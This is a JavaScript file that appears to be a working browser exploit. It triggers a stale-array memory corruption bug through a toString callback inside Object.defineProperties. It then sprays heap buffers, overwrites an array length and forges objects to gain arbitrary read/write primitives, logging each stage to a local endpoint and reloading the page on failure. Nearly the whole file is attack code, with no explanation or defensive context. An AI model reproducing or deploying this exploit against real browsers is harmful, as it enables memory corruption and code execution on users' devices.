function send(ep, data) {
	data = JSON.stringify(data);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.send('data=' + encodeURIComponent(data));
	} catch(e) {

	}
}
console = {
	log : function(msg) {
		if(onSwitch !== undefined)
			send('log', msg);
		else
			print('Log: ' + JSON.stringify(msg));
	}
};
var log = console.log;
if(onSwitch !== undefined) {
	window.onerror = function(msg, url, line) {
		send('error', [line, msg]);
		location.reload();
	};
}

log('Loaded');

function doItAll() {
	log('Starting');

	_dview = null;

	function u2d(low, hi) {
		if (!_dview) _dview = new DataView(new ArrayBuffer(16));
		_dview.setUint32(0, hi);
		_dview.setUint32(4, low);
		return _dview.getFloat64(0);
	}

	var pressure = new Array(400);
	var bufs = new Array(20000);

	dgc = function() {
		log('Pressurizing');
		for (var i = 0; i < pressure.length; i++) {
			pressure[i] = new Uint32Array(0x10000);
		}
		for (var i = 0; i < pressure.length; ++i)
			pressure[i] = 0;
	}

	function swag() {
		if(bufs[0]) return;

		dgc();

		log('Building buffers');
		for (i=0; i < bufs.length; i++) {
			bufs[i] = new Uint32Array(0x200*2)
			for (k=0; k < bufs[i].length; )
			{
				bufs[i][k++] = 0x41414141;
				bufs[i][k++] = 0xffff0000;
			}
		}
	}

	var arr = new Array(0x100);
	var yolo = new ArrayBuffer(0x1000);
	arr[0] = yolo;
	arr[1] = 0x13371337;

	var not_number = {};
	not_number.toString = function() {
		arr = null;
		props["stale"]["value"] = null;
		swag();
		return 10;
	};

	var props = {
		p0 : { value : 0 },
		p1 : { value : 1 },
		p2 : { value : 2 },
		p3 : { value : 3 },
		p4 : { value : 4 },
		p5 : { value : 5 },
		p6 : { value : 6 },
		p7 : { value : 7 },
		p8 : { value : 8 },
		length : { value : not_number },
		stale : { value : arr },
		after : { value : 666 } 
	};

	var target = [];
	var stale = 0;
	var before_len = arr.length; 
	Object.defineProperties(target, props);
	stale = target.stale;

	if(stale.length == before_len) {
		log('Failed to overwrite array');
		return;
	}

	log('Triggered.  New length: 0x' + stale.length.toString(16));

	if(stale.length != 0x41414141) {
		log('Bailing.');
		location.reload();
		return;
	}

	stale[5] = 0xDEADBEEF;

	log('Attempting to find buffer');

	function dumpbuf(count) {
		for(var j = 0; j < count; ++j)
			log('Buf[' + j + '] == 0x' + buf[k + j].toString(16));
	}

	var rwu32 = new Uint32Array(0x10);

	for (i=0; i < bufs.length; i++) {
		for (k=0; k < bufs[i].length; ) {
			if(bufs[i][k] != 0x41414141){
				var buf = tlbuf = bufs[i];
				tlstale = stale;
				tlk = k;

				stale[5] = {'a':u2d(0x60, 0x1172600),'b':u2d(0,0),'c':rwu32,'d':u2d(0x100,0)};
				stale[6] = stale[5];
				log(stale[5]);

				log('Dumping partial buffer...');
				dumpbuf(8);

				var off = 0x10;

				buf[k] += off;
				log(stale[5]);
				//log(stale[5][0]);
				stale[5][6] = 0x69;
				buf[k] -= off;

				log('Checking...');
				//log(stale[5]);
				log(rwu32.length);
				log('Dumping partial buffer...');
				dumpbuf(8);
				return;
			}
			k++;
			k++;
		}
	}

	log('Done');
}

if(onSwitch === undefined)
	doItAll();
